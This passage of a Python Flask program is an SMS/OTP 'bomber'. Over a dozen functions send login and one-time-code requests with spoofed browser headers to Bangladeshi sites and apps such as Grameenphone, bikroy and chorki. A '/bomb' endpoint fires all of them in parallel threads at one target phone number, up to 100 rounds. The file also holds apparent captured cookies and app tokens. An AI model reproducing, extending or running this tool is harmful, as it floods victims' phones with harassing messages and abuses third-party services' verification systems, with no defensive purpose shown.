        "Sxsrf": "V2xoc1MyVldiRmhPVjNScFRXcENjRlF5Y0VKa1ZURnhZWHBLVG1Wc1ZUQlVhMUpHVFZVNVJWTlljRTVoYldSNlUxYzFUMk5HYjNsT1IyeFFZVlZ3YzFSWWNISk5hekI1VTIweFlXRnRVbkpYYTFKTFlXczFTRmRZY0U1U1JrcDBWRmN4VDJGc2NFaFNiWGhQVmtack1GUnVjRzloUm14eFYxUlNUMVpGUmpaWGJGSkNaVlV4VlZadGFGQlNNV3N4VjFod2JrNVZOVmhXVkZKaFZrVlZlbFJ1Y0hOaGJIQlZVVzFzWVZJd2JEVlRWMnd6WVZad1dXRklaR2hYUlhCeldUTnNTazVyTVZWWmVrWlBZV3RHTTFSc1VrcE5hekZKVFVRd1BRPT0=",
        "Sec-Ch-Ua-Mobile": "?0",
        "Accept": "*/*",
        "Origin": "https://cartup.com",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://cartup.com/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Priority": "u=1, i"
    }
    data = {"email_or_phone": number}
    return send_request(url, "POST", headers, data)

def api_35(number):
    url = "https://auth.acsfutureschool.com/api/v1/otp/send"
    headers = {
        "Host": "auth.acsfutureschool.com",
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
        "Content-Type": "application/json",
        "Sec-Ch-Ua-Mobile": "?0",
        "Origin": "https://www.acsfutureschool.com",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://www.acsfutureschool.com/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Priority": "u=1, i"
    }
    data = {"phone": number}
    return send_request(url, "POST", headers, data)

def api_36(number):
    url = "https://api.chardike.com/api/otp/send"
    headers = {
        "Host": "api.chardike.com",
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
        "Content-Type": "application/json",
        "Sec-Ch-Ua-Mobile": "?0",
        "Accept": "*/*",
        "Origin": "https://chardike.com",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://chardike.com/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Priority": "u=1, i",
        "Connection": "keep-alive"
    }
    data = {"phone": number, "otp_type": "login"}
    return send_request(url, "POST", headers, data)

def api_37(number):
    url = "https://bb-api.bohubrihi.com/public/activity/otp"
    headers = {
        "Host": "bb-api.bohubrihi.com",
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "Authorization": "Bearer undefined",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
        "Content-Type": "application/json",
        "Sec-Ch-Ua-Mobile": "?0",
        "Origin": "https://bohubrihi.com",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://bohubrihi.com/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Priority": "u=1, i"
    }
    data = {"phone": number, "intent": "login"}
    return send_request(url, "POST", headers, data)

def api_38(number):
    url = "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web"
    headers = {
        "Host": "api-dynamic.chorki.com",
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "Authorization": "",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        "Accept": "application/json",
        "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
        "Content-Type": "application/json",
        "Sec-Ch-Ua-Mobile": "?0",
        "Origin": "https://www.chorki.com",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://www.chorki.com/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Priority": "u=1, i"
    }
    data = {"number": f"+880{number[1:]}"}
    return send_request(url, "POST", headers, data)

def api_39(number):
    url = "https://api.ostad.app/api/v2/user/with-otp"
    headers = {
        "Host": "api.ostad.app",
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "Metadata": "{\"browser\":{\"name\":\"Chrome\",\"version\":\"139.0.0.0\",\"major\":\"139\"},\"cpu\":{\"architecture\":\"amd64\"},\"device\":{},\"engine\":{\"name\":\"Blink\",\"version\":\"139.0.0.0\"},\"os\":{\"name\":\"Windows\",\"version\":\"10\"},\"displayResolution\":{\"width\":1440,\"height\":900},\"deviceType\":\"web\",\"domain\":\"ostad.app\",\"brand\":\"Chrome\",\"model\":\"Windows\"}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
        "Content-Type": "application/json",
        "Sec-Ch-Ua-Mobile": "?0",
        "Accept": "*/*",
        "Origin": "https://ostad.app",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://ostad.app/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Priority": "u=1, i"
    }
    data = {"msisdn": number}
    return send_request(url, "POST", headers, data)

def api_40(number):
    url = "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web"
    headers = {
        "Host": "api.deeptoplay.com",
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "Authorization": "",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        "Accept": "application/json",
        "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
        "Content-Type": "application/json",
        "Sec-Ch-Ua-Mobile": "?0",
        "Origin": "https://www.deeptoplay.com",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://www.deeptoplay.com/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Priority": "u=1, i"
    }
    data = {"number": f"+880{number[1:]}"}
    return send_request(url, "POST", headers, data)

def api_41(number):
    url = "https://user-api.jslglobal.co/v2/send-otp"
    headers = {
        "User-Agent": "okhttp/3.9.1",
        "Accept-Encoding": "gzip",
        "Content-Type": "application/json"
    }
    data = {"jatri_token": "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj", "phone": f"+88{number}"}
    return send_request(url, "POST", headers, data)

def api_42(number):
    url = f"https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=880{number}&lang=en&ng=0"
    headers = {
        "User-Agent": "okhttp/3.9.1",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip"
    }
    return send_request(url, "GET", headers)

def api_43(number):
    url = f"https://auth.shukhee.com/register?mobile=+88{number}&_rsc=1jwvn"
    headers = {
        "User-Agent": "okhttp/3.9.1",
        "Accept-Encoding": "gzip"
    }
    return send_request(url, "GET", headers)

def api_44(number, mno):
    url = "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/"
    headers = {
        "User-Agent": "okhttp/3.9.1",
        "Accept-Encoding": "gzip",
        "Content-Type": "application/json"
    }
    data = {"wallet_number": number, "geo_location": {"lat": 23.8979093, "long": 89.1356346}, "referral": "", "firebase_token": "e7XC0AWRR5C6rGMm6yCaZ8:APA91bHnbvs1bA_qXXb55W9GmsKmuzAUhgaR770HBH9hZCLjFV6HCejAsRGggvnD7c5dv2q_pOAdwY1peeTlzzn49cjPESTZ0NdR-bIhwe9_6of6rosH0AI", "device_uuid": "c65m117a8cbf5b1851b29f8b", "mno": mno}
    return send_request(url, "POST", headers, data)

def api_45(number):
    url = f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={number}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "application-name": "web",
        "sec-ch-ua-platform": "\"Android\"",
        "accept-language": "en",
        "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
        "sec-ch-ua-mobile": "?1",
        "dnt": "1",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://bikroy.com/en/users/login?action=my-account&redirect-url=%2Fen%2Fmy%2Fdashboard",
        "priority": "u=1, i",
        "Cookie": "ab-test.pwa-only=reactapp; _gcl_au=1.1.86288001.1746030794; _sp_ses.c10b=*; _gid=GA1.2.1084766748.1746030796; _dc_gtm_UA-33150711-4=1; _dc_gtm_UA-32287732-10=1; locale=en; _ga=GA1.2.1203804759.1746030796; _tt_enable_cookie=1; _ttp=01JT3RR4AVDBHTQXKMXWVNWQ0J_.tt.1; ttcsid=1746030825850::vUtZ63nJI5JQQk_NBo82.1.1746030825850; ttcsid_CPJ8F4RC77U6NIAFMODG=1746030825845::Pe4jUc2tv5b6Ra_ZH1Cs.1.1746030827015; _ga_LK6CFX94RC=GS1.2.1746030825.1.1.1746030827.58.0.0; _sp_id.c10b=0b3c83579420d4fd.1746030796.1.1746030827.1746030796.5cd7789a-9376-4e22-bdce-9dc8b6cfbe02; _ga_LV7HJQBLZX=GS1.1.1746030809.1.1.1746030827.42.0.0"
    }
    return send_request(url, "GET", headers)

def api_46(number):
    url = "https://rich11bd.com/api/sms/sendVerificationCode"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Content-Type": "application/json",
        "sec-ch-ua-platform": "\"Android\"",
        "accept-language": "en",
        "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
        "sec-ch-ua-mobile": "?1",
        "dnt": "1",
        "origin": "https://rich11bd.com",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://rich11bd.com/register",
        "priority": "u=1, i"
    }
    data = {"PhoneNumber": number, "IsAffiliateRegister": False, "Type": 0}
    return send_request(url, "POST", headers, data)

def process_number_api(number, amount):
    apis = [api_2, api_3, api_4, api_5, api_6, api_7, api_8, api_9, api_11, api_12, api_13, api_14, api_15, api_16, api_17, api_19, api_20, api_22, api_25, api_26, api_27, api_28, api_29, api_30, api_31, api_32, api_33, api_34, api_35, api_36, api_37, api_38, api_39, api_40, api_41, api_42, api_43, api_44, api_45, api_46]
    success_count = 0
    results = []

    for _ in range(amount):
        pgen = random_string("?n?n?n?n?n?n?n?n?n?n?n?n")
        egen = random_string("?n?n?n?n?n?n?n?n")
        did = random_string("?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i")
        did2 = random_string("?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i") # Added did2 for api_18
        name = random_string("?l?l?l?l?l?l")
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures_with_names = []
            futures_with_names.append((executor.submit(api_1, number, pgen, egen, did, name), "api_1"))
            futures_with_names.append((executor.submit(api_10, number, pgen, egen, name), "api_10"))
            futures_with_names.append((executor.submit(api_18, number, did2), "api_18")) # Added api_18
            futures_with_names.append((executor.submit(api_21, number, egen, name), "api_21")) # Added api_21
            futures_with_names.append((executor.submit(api_23, number), "api_23")) # Added api_23
            futures_with_names.append((executor.submit(api_24, number, pgen, name), "api_24")) # Added api_24
            for api_func in apis:
                futures_with_names.append((executor.submit(api_func, number), api_func.__name__))
            
            for future, api_name in futures_with_names:
                try:
                    result = future.result()
                    if result and result.status_code == 200:
                        success_count += 1
                        results.append({"status": "success", "api": api_name, "response_code": result.status_code})
                    else:
                        results.append({"status": "failed", "api": api_name, "response_code": result.status_code if result else "N/A"})
                except Exception as e:
                    results.append({"status": "error", "api": api_name, "error_message": str(e)})
        time.sleep(1) # Delay between batches of requests

    return {"total_requests_attempted": amount * (len(apis) + 6), "successful_requests": success_count, "details": results}

@app.route('/bomb', methods=['POST'])
def bomb_api():
    data = request.get_json()
    number = data.get('number')
    amount = data.get('amount')

    if not number or not amount:
        return jsonify({"error": "Please provide 'number' and 'amount' in the request body."}), 400
    
    try:
        amount = int(amount)
    except ValueError:
        return jsonify({"error": "'amount' must be an integer."}), 400

    if not (1 <= amount <= 100): # Limit amount to prevent abuse and Vercel timeouts
        return jsonify({"error": "'amount' must be between 1 and 100."}), 400

    try:
        result = process_number_api(number, amount)
        return jsonify(result), 200
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        return jsonify({"error": f"An internal server error occurred: {str(e)}"}), 500

@app.route('/')
def home():
    return app.send_static_file('index.html')

# Serve static files (like index.html) from the current directory
app.static_folder = '.'

if __name__ == '__main__':
    app.run(debug=True)
